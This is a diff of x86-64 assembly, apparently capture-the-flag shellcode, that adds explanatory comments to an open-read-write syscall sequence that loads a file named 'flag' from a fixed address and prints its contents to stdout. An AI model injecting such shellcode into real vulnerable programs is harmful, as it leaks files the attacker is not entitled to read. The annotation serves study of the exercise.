@@ -1,20 +1,20 @@
 ; Open (the flag)
 mov rax, 0x02
-mov rdi, 0x4141407e
-mov rdx, 0
+mov rdi, 0x4141407e     ; address of the flag name
+mov rdx, 0     ; Read-only
 syscall
 ; Read (the contents of the flag)
-sub rsp, 1000
-mov rbx, rax
+sub rsp, 1000     ; Increase the stack size by 1000 in order to insert the contents of the flag to rsp
+mov rbx, rax     ; save fd into rbx
 mov rax, 0
 mov rdi, rbx
 mov rsi, rsp
 mov rdx, 1000
 syscall
 ; Write (to stdout)
-mov rbx, rax
+mov rbx, rax    ; save the size of the flag into rbx
 mov rax, 1
-mov rdi, 1
+mov rdi, 1    ; stdout
 mov rsi, rsp
 mov rdx, rbx
 syscall
